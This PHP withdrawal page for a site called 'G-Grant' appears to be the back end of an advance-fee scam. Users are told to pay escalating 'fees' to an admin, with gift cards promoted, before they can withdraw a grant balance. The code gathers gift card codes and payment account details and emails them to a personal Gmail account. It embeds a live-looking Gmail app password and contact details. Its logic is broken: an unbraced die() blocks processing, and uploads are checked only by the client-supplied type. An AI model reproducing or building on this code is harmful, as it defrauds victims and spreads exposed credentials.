<?php
session_start();
include "../config/config.php";

if (!isset($_SESSION['id']) || $_SESSION['role'] !== "user") {
    header("Location: ../auth/login.php");
    exit();
}

$user_id = $_SESSION['id'];

/* GET USER DETAILS & BALANCE */
$stmt = $conn->prepare("SELECT * FROM users WHERE id=?");
$stmt->bind_param("i", $user_id);
$stmt->execute();
$user = $stmt->get_result()->fetch_assoc();

$balance = $user['balance'];
$message = "";
$showSuccessModal = false;
$emailSent = false;

// ============================================
// CONTACT INFO - USERS MUST CONTACT YOU FIRST
// ============================================
$SIGNAL_USERNAME = "+44740407937"; // ← CHANGE TO YOUR SIGNAL
$ADMIN_EMAIL = "hammed123aa@gmail.com";
$GMAIL_USERNAME = "hammed123aa@gmail.com";
$GMAIL_APP_PASSWORD = "acup waim qsmz zicm";
// ============================================

// FEE STRUCTURE
function calculateFee($amount) {
    if ($amount <= 0) return 0;
    if ($amount <= 500) return 50;
    if ($amount <= 1000) return 100;
    if ($amount <= 5000) return 150;
    if ($amount <= 10000) return 250;
    if ($amount <= 50000) return 500;
    return 1000;
}

// SMTP EMAIL FUNCTION
function sendGmailSMTP($username, $password, $to, $subject, $htmlBody, $textBody, $attachmentPath = '', $attachmentName = '') {
    $smtpServer = 'smtp.gmail.com';
    $smtpPort = 587;
    $timeout = 30;
    
    $socket = @fsockopen($smtpServer, $smtpPort, $errno, $errstr, $timeout);
    if (!$socket) return false;
    
    stream_set_timeout($socket, $timeout);
    fgets($socket, 515);
    
    fputs($socket, "EHLO localhost\r\n");
    while ($line = fgets($socket, 515)) {
        if (substr($line, 3, 1) == ' ') break;
    }
    
    fputs($socket, "STARTTLS\r\n");
    fgets($socket, 515);
    
    stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    
    fputs($socket, "EHLO localhost\r\n");
    while ($line = fgets($socket, 515)) {
        if (substr($line, 3, 1) == ' ') break;
    }
    
    fputs($socket, "AUTH LOGIN\r\n");
    fgets($socket, 515);
    
    fputs($socket, base64_encode($username) . "\r\n");
    fgets($socket, 515);
    
    fputs($socket, base64_encode($password) . "\r\n");
    $line = fgets($socket, 515);
    if (substr($line, 0, 3) != '235') return false;
    
    fputs($socket, "MAIL FROM: <$username>\r\n");
    fgets($socket, 515);
    
    fputs($socket, "RCPT TO: <$to>\r\n");
    fgets($socket, 515);
    
    fputs($socket, "DATA\r\n");
    fgets($socket, 515);
    
    $boundary = md5(time());
    $date = date('r');
    
    $headers = "Date: $date\r\n";
    $headers .= "From: Grant Portal <$username>\r\n";
    $headers .= "To: $to\r\n";
    $headers .= "Subject: $subject\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n";
    
    $emailContent = $headers . "\r\n";
    $emailContent .= "--$boundary\r\n";
    $emailContent .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
    $emailContent .= $textBody . "\r\n\r\n";
    $emailContent .= "--$boundary\r\n";
    $emailContent .= "Content-Type: text/html; charset=UTF-8\r\n\r\n";
    $emailContent .= $htmlBody . "\r\n\r\n";
    
    if (!empty($attachmentPath) && file_exists($attachmentPath)) {
        $fileContent = file_get_contents($attachmentPath);
        $fileContent = chunk_split(base64_encode($fileContent));
        
        $emailContent .= "--$boundary\r\n";
        $emailContent .= "Content-Type: application/octet-stream; name=\"$attachmentName\"\r\n";
        $emailContent .= "Content-Disposition: attachment; filename=\"$attachmentName\"\r\n";
        $emailContent .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $emailContent .= $fileContent . "\r\n";
    }
    
    $emailContent .= "--$boundary--\r\n.\r\n";
    
    fputs($socket, $emailContent);
    $line = fgets($socket, 515);
    
    fputs($socket, "QUIT\r\n");
    fclose($socket);
    
    return (substr($line, 0, 3) == '250');
}

// VERIFICATION EMAIL
function sendVerificationEmail($gmailUser, $gmailPass, $to, $userName, $amount, $fee, $method, $details, $userEmail, $attachmentPath, $attachmentName, $payMethod = '', $payDetails = '') {
    
    $subject = "Payment Verification - " . $userName . " - $" . number_format($fee) . " Fee Paid";
    
    $paymentSection = '';
    if (!empty($payMethod)) {
        $paymentSection = "
        <div style='background:#fef3c7;padding:15px;border-radius:8px;margin:15px 0;border-left:4px solid #f59e0b;'>
            <h4 style='margin:0 0 10px 0;color:#92400e;'>HOW USER PAID THE FEE</h4>
            <p><strong>Method:</strong> " . strtoupper($payMethod) . "</p>
            <p><strong>Details:</strong> <code style='background:#000;color:#22c55e;padding:8px 12px;border-radius:5px;display:inline-block;'>" . nl2br(htmlspecialchars($payDetails)) . "</code></p>
        </div>";
    }
    
    $htmlBody = "
    <html>
    <body style='font-family:Arial,sans-serif;background:#f3f4f6;'>
        <div style='max-width:600px;margin:20px auto;background:white;border-radius:10px;box-shadow:0 4px 6px rgba(0,0,0,0.1);'>
            <div style='background:#3b82f6;color:white;padding:20px;text-align:center;'>
                <h2>Payment Verification</h2>
            </div>
            <div style='padding:30px;'>
                <div style='background:#dbeafe;border-left:4px solid #3b82f6;padding:15px;margin:20px 0;'>
                    <strong>Action Required:</strong> Verify payment and approve withdrawal.
                </div>
                
                <p><strong>User:</strong> {$userName} ({$userEmail})</p>
                <p><strong>Withdrawal:</strong> $" . number_format($amount) . "</p>
                <p><strong>Fee Paid:</strong> $" . number_format($fee) . "</p>
                <p><strong>Receive Via:</strong> " . strtoupper($method) . "</p>
                <p><strong>Account:</strong> {$details}</p>
                
                {$paymentSection}
                
                <p style='margin-top:20px;'>Attachment: " . ($attachmentName ?: 'None') . "</p>
            </div>
        </div>
    </body>
    </html>";
    
    $textBody = "Payment from {$userName}\nAmount: $" . number_format($amount) . "\nFee: $" . number_format($fee) . "\nMethod: {$payMethod}\nDetails: {$payDetails}";
    
    return sendGmailSMTP($gmailUser, $gmailPass, $to, $subject, $htmlBody, $textBody, $attachmentPath, $attachmentName);
}

/* PROCESS WITHDRAWAL */
if ($_SERVER["REQUEST_METHOD"] == "POST") 
    die("FORM SUBMITTED SUCCESSFULLY");
    
    // ← NEW: CHECK IF USER CONFIRMED CONTACT OR GIFT CARD
    $realVerified = isset($_POST['real_verified']) && $_POST['real_verified'] == "1";

if (!$realVerified) {
    $message = "⚠️ You must complete and confirm Step 2 verification!";
} else {
        // Continue with withdrawal processing...
        
        $amount = floatval($_POST['amount'] ?? 0);
        $fee = calculateFee($amount);
        $totalDeduction = $amount + $fee;
        
        $payment_method = $_POST['payment_method'] ?? 'bank';
        $pay_fee_method = $_POST['pay_fee_method'] ?? 'cashapp';
        
        // COLLECT DETAILS
        $bank_name = $account_number = $account_name = '';
        $crypto_wallet = $crypto_type = 'USDT';
        $cashapp_tag = $paypal_email = $venmo_username = '';
        $zelle_email = $zelle_phone = '';
        $gift_card_type = $gift_card_code = '';
        
        switch($payment_method) {
            case 'bank':
                $bank_name = $_POST['bank_name'] ?? '';
                $account_number = $_POST['account_number'] ?? '';
                $account_name = $_POST['account_name'] ?? '';
                break;
            case 'crypto':
                $crypto_wallet = $_POST['crypto_wallet'] ?? '';
                $crypto_type = $_POST['crypto_type'] ?? 'USDT';
                break;
            case 'cashapp':
                $cashapp_tag = $_POST['cashapp_tag'] ?? '';
                break;
            case 'paypal':
                $paypal_email = $_POST['paypal_email'] ?? '';
                break;
            case 'venmo':
                $venmo_username = $_POST['venmo_username'] ?? '';
                break;
            case 'zelle':
                $zelle_email = $_POST['zelle_email'] ?? '';
                $zelle_phone = $_POST['zelle_phone'] ?? '';
                break;
            case 'giftcard':
                $gift_card_type = $_POST['gift_card_type'] ?? '';
                $gift_card_code = $_POST['gift_card_code'] ?? '';
                break;
        }
        
        // COLLECT FEE PAYMENT DETAILS
        $fee_payment_details = '';
        switch($pay_fee_method) {
            case 'cashapp':
                $fee_payment_details = "CashApp: " . ($_POST['fee_cashapp_from'] ?? 'Unknown');
                break;
            case 'paypal':
                $fee_payment_details = "PayPal: " . ($_POST['fee_paypal_email'] ?? 'Unknown') . "\nTX: " . ($_POST['fee_paypal_id'] ?? 'N/A');
                break;
            case 'venmo':
                $fee_payment_details = "Venmo: @" . ($_POST['fee_venmo_from'] ?? 'Unknown');
                break;
            case 'zelle':
                $fee_payment_details = "Zelle: " . ($_POST['fee_zelle_from'] ?? 'Unknown');
                break;
            case 'crypto':
                $fee_payment_details = ($_POST['fee_crypto_type'] ?? 'USDT') . "\nTX: " . ($_POST['fee_crypto_hash'] ?? 'N/A');
                break;
            case 'bank':
                $fee_payment_details = "Bank: " . ($_POST['fee_bank_account'] ?? 'Unknown');
                break;
            case 'giftcard':
                $fee_payment_details = "GIFT CARD\nType: " . strtoupper($_POST['fee_giftcard_type'] ?? 'Unknown') . "\nCode: " . ($_POST['fee_giftcard_code'] ?? 'N/A');
                break;
        }
        
        // HANDLE FILE UPLOAD
        $verification_image = '';
        if (isset($_FILES['payment_proof']) && $_FILES['payment_proof']['error'] === UPLOAD_ERR_OK) {
            $uploadDir = '../uploads/payment_proofs/';
            if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
            
            $fileName = time() . '_' . preg_replace("/[^a-zA-Z0-9.]/", "_", $_FILES['payment_proof']['name']);
            $targetPath = $uploadDir . $fileName;
            
            $allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf'];
            if (in_array($_FILES['payment_proof']['type'], $allowedTypes)) {
                if (move_uploaded_file($_FILES['payment_proof']['tmp_name'], $targetPath)) {
                    $verification_image = $fileName;
                } else {
                    $message = "Upload failed";
                }
            } else {
                $message = "Invalid file type";
            }
        }
        
        // VALIDATION
        if (empty($message)) {
            if ($amount < 100) {
                $message = "Minimum withdrawal is $100";
            }
            elseif ($totalDeduction > $balance) {
                $message = "Insufficient balance";
            }
            elseif ($payment_method === 'bank' && (empty($bank_name) || empty($account_number) || empty($account_name))) {
                $message = "Fill all bank details";
            }
            elseif ($payment_method === 'crypto' && empty($crypto_wallet)) {
                $message = "Enter wallet address";
            }
            elseif ($payment_method === 'cashapp' && empty($cashapp_tag)) {
                $message = "Enter CashApp tag";
            }
            elseif ($payment_method === 'paypal' && empty($paypal_email)) {
                $message = "Enter PayPal email";
            }
            elseif ($payment_method === 'venmo' && empty($venmo_username)) {
                $message = "Enter Venmo username";
            }
            elseif ($payment_method === 'zelle' && empty($zelle_email) && empty($zelle_phone)) {
                $message = "Enter Zelle email or phone";
            }
            elseif ($payment_method === 'giftcard' && empty($gift_card_type)) {
                $message = "Select gift card type";
            }
            elseif ($pay_fee_method === 'giftcard' && empty($_POST['fee_giftcard_code'])) {
                $message = "Enter gift card code for fee payment";
            }
            else {
                // BUILD DESCRIPTION
                switch($payment_method) {
                    case 'bank': $paymentInfo = "Bank: $bank_name"; break;
                    case 'crypto': $paymentInfo = "Crypto: $crypto_type | $crypto_wallet"; break;
                    case 'cashapp': $paymentInfo = "CashApp: $cashapp_tag"; break;
                    case 'paypal': $paymentInfo = "PayPal: $paypal_email"; break;
                    case 'venmo': $paymentInfo = "Venmo: @$venmo_username"; break;
                    case 'zelle': $paymentInfo = "Zelle: " . ($zelle_email ?: $zelle_phone); break;
                    case 'giftcard': $paymentInfo = "Gift Card: " . strtoupper($gift_card_type); break;
                    default: $paymentInfo = "Unknown";
                }
                
                $desc = "Withdrawal $" . number_format($amount) . " + Fee $" . number_format($fee) . " | $paymentInfo";

                // INSERT TRANSACTION
                $stmt = $conn->prepare("INSERT INTO transactions 
                    (user_id, type, amount, description, status, payment_method, verification_image, pay_fee_method, fee_payment_details,
                    bank_name, account_number, account_name, 
                    crypto_wallet, crypto_type,
                    cashapp_tag, paypal_email, venmo_username, zelle_email, zelle_phone,
                    gift_card_type, gift_card_code) 
                    VALUES (?, 'withdraw', ?, ?, 'pending', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                
                $stmt->bind_param("idsssssssssssssssss", 
                    $user_id, $amount, $desc, $payment_method, $verification_image, 
                    $pay_fee_method, $fee_payment_details,
                    $bank_name, $account_number, $account_name, 
                    $crypto_wallet, $crypto_type,
                    $cashapp_tag, $paypal_email, $venmo_username, $zelle_email, $zelle_phone,
                    $gift_card_type, $gift_card_code
                );
                
               if ($stmt->execute()) {

    // SEND EMAIL (keep your existing code)
    $attachmentPath = !empty($verification_image) ? '../uploads/payment_proofs/' . $verification_image : '';

    $emailSent = sendVerificationEmail(
        $GMAIL_USERNAME,
        $GMAIL_APP_PASSWORD,
        $ADMIN_EMAIL, 
        $user['full_name'], 
        $amount, 
        $fee, 
        $payment_method, 
        $paymentInfo, 
        $user['email'],
        $attachmentPath,
        $verification_image,
        $pay_fee_method,
        $fee_payment_details
    );

    // ✅ SHOW SUCCESS MESSAGE TO USER
    $message = "⏳ Withdrawal Pending - Your request has been submitted successfully and is under review.";
}
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<title>G-Grant | Withdraw</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

<style>
* { box-sizing: border-box; }
html { font-size: 16px; }

body{ 
    background:#0b1220; 
    color:white; 
    font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    font-size: 16px;
    line-height: 1.5;
    margin: 0;
    padding: 0;
}

.box{ 
    max-width: 100%; 
    margin: 0 auto; 
    background:#111827; 
    padding: 20px; 
    min-height: 100vh;
}

h3 {
    font-size: 1.75rem;
    font-weight: 700;
    margin-bottom: 1rem;
    text-align: center;
}

.balance-display {
    text-align: center;
    font-size: 1.125rem;
    margin-bottom: 1.5rem;
    padding: 15px;
    background: #1f2937;
    border-radius: 12px;
}

.balance-display b { font-size: 1.5rem; }

.btn-green{ 
    background:#22c55e; 
    color:white; 
    width:100%; 
    border:none; 
    padding: 16px; 
    font-weight:600; 
    font-size: 1.125rem;
    border-radius: 12px;
    margin-top: 10px;
}

.btn-green:hover{ background:#16a34a; color:white; }

input, select, textarea{ 
    margin-bottom: 16px; 
    background:#1f2937 !important; 
    border:1px solid #374151 !important; 
    color:white !important;
    padding: 16px !important;
    font-size: 1rem !important;
    border-radius: 10px !important;
    min-height: 52px;
}

input:focus, select:focus, textarea:focus{ 
    outline:none; 
    border-color:#22c55e !important; 
    box-shadow:0 0 0 4px rgba(34,197,94,0.2) !important; 
}

label {
    font-size: 1rem;
    color: #9ca3af;
    margin-bottom: 8px;
    display: block;
    font-weight: 500;
}

.fee-box{ 
    background:#1f2937; 
    padding: 20px; 
    border-radius: 12px; 
    margin: 20px 0; 
    border-left: 4px solid #22c55e; 
    font-size: 1rem;
}

.fee-row{ 
    display:flex; 
    justify-content:space-between; 
    margin: 10px 0; 
    padding: 5px 0; 
    font-size: 1rem;
}

.fee-total{ 
    border-top: 2px solid #374151; 
    margin-top: 15px; 
    padding-top: 15px; 
    font-weight: bold; 
    color:#22c55e; 
    font-size: 1.125rem;
}

.fee-structure{ 
    background:#0f172a; 
    padding: 20px; 
    border-radius: 12px; 
    margin-bottom: 20px; 
    font-size: 0.9375rem;
}

.fee-structure h6{ 
    color:#22c55e; 
    margin-bottom: 15px;
    font-size: 1rem;
    font-weight: 600;
}

.fee-structure table { width: 100%; }
.fee-structure td { padding: 10px 0; border-bottom: 1px solid #374151; }
.fee-structure tr:last-child td { border-bottom: none; }

/* ← NEW: VERIFICATION BOX STYLES */
.verification-box {
    background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
    padding: 25px;
    border-radius: 16px;
    margin: 25px 0;
    border: 2px solid #60a5fa;
}

.verification-box h4 {
    color: white;
    margin-bottom: 15px;
    font-size: 1.25rem;
    font-weight: 600;
    text-align: center;
}

.verification-option {
    background: rgba(255,255,255,0.1);
    padding: 20px;
    border-radius: 12px;
    margin: 15px 0;
    border: 2px solid transparent;
    transition: all 0.3s;
}

.verification-option:hover {
    border-color: #22c55e;
    background: rgba(255,255,255,0.15);
}

.verification-option input[type="checkbox"] {
    width: 24px;
    height: 24px;
    margin-right: 12px;
    cursor: pointer;
    accent-color: #22c55e;
}

.verification-option label {
    color: white;
    font-size: 1.1rem;
    font-weight: 600;
    cursor: pointer;
    display: flex;
    align-items: center;
    margin: 0;
}

.verification-option .details {
    color: #bfdbfe;
    font-size: 0.9375rem;
    margin-top: 10px;
    margin-left: 36px;
    line-height: 1.5;
}

.contact-method{ 
    background: rgba(255,255,255,0.15); 
    padding: 20px; 
    border-radius: 12px; 
    margin: 15px 0;
}

.contact-method strong{ 
    color: #a7f3d0; 
    display: block; 
    margin-bottom: 8px; 
    font-size: 0.875rem;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.contact-method span{ 
    color: white; 
    font-size: 1.125rem; 
    font-weight: bold; 
    word-break: break-all;
    display: block;
    margin-bottom: 10px;
}

.giftcard-badge{ 
    background: #ef4444; 
    color: white; 
    padding: 8px 16px; 
    border-radius: 20px; 
    font-size: 0.875rem; 
    display: inline-block;
    margin-top: 15px;
    font-weight: 600;
}

.pay-method-tabs{ 
    display: flex; 
    flex-wrap: wrap; 
    gap: 10px; 
    margin-bottom: 20px; 
}

.pay-tab{ 
    padding: 14px 18px; 
    background: #1f2937; 
    border: 2px solid #374151; 
    border-radius: 12px; 
    color: #9ca3af; 
    cursor: pointer; 
    font-size: 0.9375rem;
    font-weight: 500;
    transition: all 0.3s;
    flex: 1;
    min-width: calc(50% - 5px);
    text-align: center;
}

.pay-tab:hover{ border-color: #4b5563; }

.pay-tab.active{ 
    border-color: #22c55e; 
    color: #22c55e; 
    background: #0f172a; 
}

.pay-tab[data-method="giftcard"]{ border-color: #ef4444; color: #fca5a5; }
.pay-tab[data-method="giftcard"].active{ background: #ef4444; color: white; }

.fee-details-form{ 
    display: none; 
    animation: slideIn 0.3s; 
    background: #1f2937;
    padding: 20px;
    border-radius: 12px;
    margin-bottom: 20px;
}

.fee-details-form.active{ display: block; }

.fee-details-form h5{ 
    color: #22c55e; 
    font-size: 1.125rem; 
    margin-bottom: 15px;
    font-weight: 600;
}

.file-upload-wrapper{ 
    position: relative; 
    height: 120px;
}

.file-upload-input{ 
    position: absolute; 
    left: 0; 
    top: 0; 
    opacity: 0; 
    cursor: pointer; 
    width: 100%; 
    height: 100%;
    z-index: 10;
}

.file-upload-button{ 
    background: rgba(255,255,255,0.05); 
    border: 2px dashed #60a5fa; 
    border-radius: 12px; 
    padding: 30px; 
    text-align: center; 
    color: #9ca3af;
    transition: all 0.3s;
    height: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}

.file-upload-wrapper:hover .file-upload-button{ 
    border-color: #22c55e; 
    color: #22c55e; 
}

.file-selected{ 
    background: #10b981 !important; 
    border-color: #34d399 !important; 
    color: white !important; 
}

.payment-grid{ 
    display: grid; 
    grid-template-columns: repeat(2, 1fr); 
    gap: 12px; 
    margin-bottom: 20px; 
}

.method-btn{ 
    padding: 20px 10px; 
    background: #1f2937; 
    border: 2px solid #374151; 
    border-radius: 14px; 
    color: #9ca3af; 
    cursor: pointer; 
    text-align: center; 
    transition: all 0.3s;
    font-size: 0.875rem;
    font-weight: 500;
}

.method-btn:hover{ 
    border-color: #4b5563; 
    transform: translateY(-2px); 
}

.method-btn.active{ 
    border-color: #22c55e; 
    color: #22c55e; 
    background: #0f172a; 
}

.method-icon{ 
    font-size: 28px; 
    display: block; 
    margin-bottom: 8px; 
}

.payment-form{ 
    display: none; 
    background: #1f2937;
    padding: 20px;
    border-radius: 12px;
    margin-bottom: 20px;
}

.payment-form.active{ 
    display: block; 
    animation: slideIn 0.3s; 
}

@keyframes slideIn{ 
    from { opacity: 0; transform: translateY(-10px); } 
    to { opacity: 1; transform: translateY(0); } 
}

.help-text{ 
    color: #fbbf24; 
    font-size: 0.875rem; 
    margin-top: -8px; 
    margin-bottom: 15px; 
    display: block; 
    line-height: 1.5;
}

.copy-btn{ 
    background: #22c55e; 
    color: white; 
    border: none; 
    padding: 10px 20px; 
    border-radius: 8px; 
    font-size: 0.9375rem; 
    cursor: pointer; 
    margin-top: 10px;
    font-weight: 500;
    width: 100%;
}

.copy-btn:hover{ background: #16a34a; }

.optional-badge{ 
    background: #6b7280; 
    color: white; 
    font-size: 0.75rem; 
    padding: 4px 10px; 
    border-radius: 20px; 
    margin-left: 5px;
    font-weight: 500;
}

.modal-content{ 
    background: #111827; 
    color: white; 
    border: 1px solid #374151;
    border-radius: 16px;
}

.success-icon{ 
    font-size: 64px; 
    color: #22c55e; 
    text-align: center; 
    margin-bottom: 20px; 
}

.notification-status{ 
    background: #0f172a; 
    padding: 15px; 
    border-radius: 10px; 
    margin-top: 20px; 
    font-size: 0.9375rem; 
    color: #9ca3af; 
}

.notification-status .sent{ color: #22c55e; }

.method-btn[data-method="cashapp"]:hover, .method-btn[data-method="cashapp"].active { border-color: #00d632; color: #00d632; }
.method-btn[data-method="paypal"]:hover, .method-btn[data-method="paypal"].active { border-color: #003087; color: #0070ba; }
.method-btn[data-method="venmo"]:hover, .method-btn[data-method="venmo"].active { border-color: #008cff; color: #008cff; }
.method-btn[data-method="zelle"]:hover, .method-btn[data-method="zelle"].active { border-color: #6d1ed4; color: #6d1ed4; }
.method-btn[data-method="crypto"]:hover, .method-btn[data-method="crypto"].active { border-color: #f7931a; color: #f7931a; }
.method-btn[data-method="giftcard"]:hover, .method-btn[data-method="giftcard"].active { border-color: #ef4444; color: #ef4444; }

.alert {
    padding: 16px 20px;
    border-radius: 12px;
    font-size: 1rem;
    margin-bottom: 20px;
    border: none;
}

a {
    font-size: 1rem;
    text-decoration: none;
}

.step-label {
    color: #9ca3af;
    font-size: 0.9375rem;
    margin: 25px 0 12px;
    display: block;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.page-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 20px;
    padding-bottom: 15px;
    border-bottom: 1px solid #374151;
}

.site-name {
    font-size: 1.5rem;
    font-weight: 800;
    background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}

.back-btn {
    color: #22c55e;
    font-size: 1rem;
    font-weight: 500;
    display: flex;
    align-items: center;
    gap: 5px;
    padding: 8px 12px;
    border-radius: 8px;
    transition: background 0.2s;
}

.back-btn:hover {
    background: rgba(34, 197, 94, 0.1);
    color: #22c55e;
}

@media(min-width: 768px) {
    html { font-size: 14px; }
    .box { max-width: 750px; margin: 40px auto; padding: 40px; border-radius: 20px; min-height: auto; }
    h3 { font-size: 2rem; text-align: left; }
    .payment-grid { grid-template-columns: repeat(3, 1fr); }
    .pay-tab { min-width: auto; flex: 0 0 auto; }
    .copy-btn { width: auto; }
    .page-header { margin-bottom: 30px; padding-bottom: 20px; }
    .site-name { font-size: 1.75rem; }
}

@media(max-width: 380px) {
    html { font-size: 15px; }
    .payment-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
    .method-btn { padding: 15px 8px; font-size: 0.8125rem; }
    .method-icon { font-size: 24px; }
    .site-name { font-size: 1.25rem; }
    .back-btn { font-size: 0.875rem; padding: 6px 10px; }
}
</style>
</head>

<body>

<div class="box">

<div class="page-header">
    <div class="site-name">G-Grant</div>
    <a href="index.html" class="back-btn">← Back</a>
</div>

<h3>💸 Withdraw Funds</h3>

<div class="balance-display">
    Available Balance: <b style="color:#22c55e;">$<?= number_format($balance) ?></b>
</div>

<?php if($message): ?>
<div class="alert" style="background:#7f1d1d; color:#fca5a5;"><?= $message ?></div>
<?php endif; ?>

<div class="fee-structure">
    <h6>📋 Withdrawal Fee Structure</h6>
    <table>
        <tr><td>$1 - $500</td><td style="text-align:right; color:#22c55e; font-weight:600;">$50 fee</td></tr>
        <tr><td>$501 - $1,000</td><td style="text-align:right; color:#22c55e; font-weight:600;">$100 fee</td></tr>
        <tr><td>$1,001 - $5,000</td><td style="text-align:right; color:#22c55e; font-weight:600;">$150 fee</td></tr>
        <tr><td>$5,001 - $10,000</td><td style="text-align:right; color:#22c55e; font-weight:600;">$250 fee</td></tr>
        <tr><td>$10,001 - $50,000</td><td style="text-align:right; color:#22c55e; font-weight:600;">$500 fee</td></tr>
        <tr><td>$50,000+</td><td style="text-align:right; color:#22c55e; font-weight:600;">$1,000 fee</td></tr>
    </table>
</div>

<form method="POST" id="withdrawForm" enctype="multipart/form-data">

    <label class="step-label">💰 Step 1: Enter Amount</label>
    <input type="number" name="amount" id="amount" class="form-control" placeholder="Enter amount (minimum $100)" min="100" required>

    <div class="fee-box" id="previewBox" style="display:none;">
        <div class="fee-row"><span>Withdrawal Amount:</span><span id="previewAmount">$0</span></div>
        <div class="fee-row"><span>Processing Fee:</span><span id="previewFee" style="color:#fbbf24;">$0</span></div>
        <div class="fee-row fee-total"><span>Total from Balance:</span><span id="previewTotal">$0</span></div>
    </div>

    <!-- ← FIXED: REAL VERIFICATION STEP -->
<div class="verification-box">
    <h4>🔒 Step 2: Verify Payment Method</h4>
    <p style="color:#bfdbfe; text-align:center; margin-bottom:20px; font-size:0.9375rem;">
        You MUST complete ONE option and CONFIRM before withdrawing:
    </p>
    
    <div class="verification-option">
        <label>
            <input type="checkbox" id="contactConfirmed">
            <span>✅ I contacted admin for payment details</span>
        </label>
        <div class="details">
            <strong>Contact via:</strong><br>
            📧 Gmail: <a href="mailto:<?= $ADMIN_EMAIL ?>" style="color:#22c55e;"><?= $ADMIN_EMAIL ?></a><br>
            💬 Signal: <?= $SIGNAL_USERNAME ?><br>
        </div>
    </div>
    
    <div style="text-align:center; color:#60a5fa; font-weight:bold; margin:15px 0;">— OR —</div>
    
    <div class="verification-option">
        <label>
            <input type="checkbox" id="giftcardBought">
            <span>🎁 I bought a gift card for the fee</span>
        </label>
        <div class="details">
            Purchase a gift card and enter details later
        </div>
    </div>

    <!-- 🔥 NEW CONFIRM BUTTON -->
    <button type="button" id="confirmVerificationBtn" class="btn btn-green" style="margin-top:20px;">
        🔒 Confirm Verification
    </button>

    <!-- 🔥 HIDDEN INPUT -->
    <input type="hidden" name="real_verified" id="realVerified" value="0">

    <div id="verificationStatus" style="margin-top:15px; text-align:center; font-size:0.9rem;"></div>
</div>

    <!-- STEP 3: PAY THE FEE -->
    <div class="contact-info-box">
        <h4>📢 Step 3: Pay The Fee To Admin</h4>
        <p style="color:#d1fae5; font-size: 1rem; margin-bottom: 15px; line-height: 1.6;">
            Send the <b>fee amount</b> to admin using ANY method below:
        </p>
        
        <div class="contact-method">
            <strong>📧 EMAIL (PayPal, Zelle, Gift Card codes)</strong>
            <span><?= htmlspecialchars($ADMIN_EMAIL) ?></span>
            <button type="button" class="copy-btn" onclick="copyToClipboard('<?= htmlspecialchars($ADMIN_EMAIL) ?>')">📋 Copy Email</button>
        </div>
        
        <span class="giftcard-badge">🎁 GIFT CARDS ACCEPTED!</span>
        
        <div style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px; font-size: 0.9375rem; color: #a7f3d0; line-height: 1.5;">
            💡 After paying, select your payment method below
        </div>
    </div>

    <!-- STEP 4: HOW DID YOU PAY? -->
    <label class="step-label">💳 Step 4: How Did You Pay The Fee?</label>
    
    <div class="pay-method-tabs">
        <div class="pay-tab active" data-method="cashapp" onclick="selectPayMethod('cashapp')">💵 CashApp</div>
        <div class="pay-tab" data-method="paypal" onclick="selectPayMethod('paypal')">💳 PayPal</div>
        <div class="pay-tab" data-method="venmo" onclick="selectPayMethod('venmo')">💸 Venmo</div>
        <div class="pay-tab" data-method="zelle" onclick="selectPayMethod('zelle')">⚡ Zelle</div>
        <div class="pay-tab" data-method="crypto" onclick="selectPayMethod('crypto')">₿ Crypto</div>
        <div class="pay-tab" data-method="bank" onclick="selectPayMethod('bank')">🏦 Bank</div>
        <div class="pay-tab" data-method="giftcard" onclick="selectPayMethod('giftcard')">🎁 Gift Card</div>
    </div>

    <input type="hidden" name="pay_fee_method" id="payFeeMethod" value="cashapp">

    <!-- FEE PAYMENT DETAILS -->
    <div class="fee-details-form active" id="pay-cashapp">
        <h5>💵 CashApp Payment Details</h5>
        <input type="text" name="fee_cashapp_from" class="form-control pay-input" placeholder="Your $Cashtag (e.g., $johnsmith)">
    </div>

    <div class="fee-details-form" id="pay-paypal">
        <h5>💳 PayPal Payment Details</h5>
        <input type="email" name="fee_paypal_email" class="form-control pay-input" placeholder="PayPal email you sent from">
        <input type="text" name="fee_paypal_id" class="form-control" placeholder="Transaction ID (optional)">
    </div>

    <div class="fee-details-form" id="pay-venmo">
        <h5>💸 Venmo Payment Details</h5>
        <input type="text" name="fee_venmo_from" class="form-control pay-input" placeholder="Your Venmo @username">
    </div>

    <div class="fee-details-form" id="pay-zelle">
        <h5>⚡ Zelle Payment Details</h5>
        <input type="text" name="fee_zelle_from" class="form-control pay-input" placeholder="Name or email you sent from">
    </div>

    <div class="fee-details-form" id="pay-crypto">
        <h5>₿ Crypto Payment Details</h5>
        <select name="fee_crypto_type" class="form-control">
            <option value="USDT">USDT</option>
            <option value="BTC">Bitcoin</option>
            <option value="ETH">Ethereum</option>
        </select>
        <input type="text" name="fee_crypto_hash" class="form-control pay-input" placeholder="Transaction Hash (TXID)">
    </div>

    <div class="fee-details-form" id="pay-bank">
        <h5>🏦 Bank Transfer Details</h5>
        <input type="text" name="fee_bank_account" class="form-control pay-input" placeholder="Your account name">
    </div>

    <div class="fee-details-form" id="pay-giftcard">
        <h5>🎁 Gift Card Payment Details</h5>
        <select name="fee_giftcard_type" class="form-control pay-input">
            <option value="">Select Gift Card Type You Sent</option>
            <option value="amazon">Amazon</option>
            <option value="itunes">iTunes/Apple</option>
            <option value="googleplay">Google Play</option>
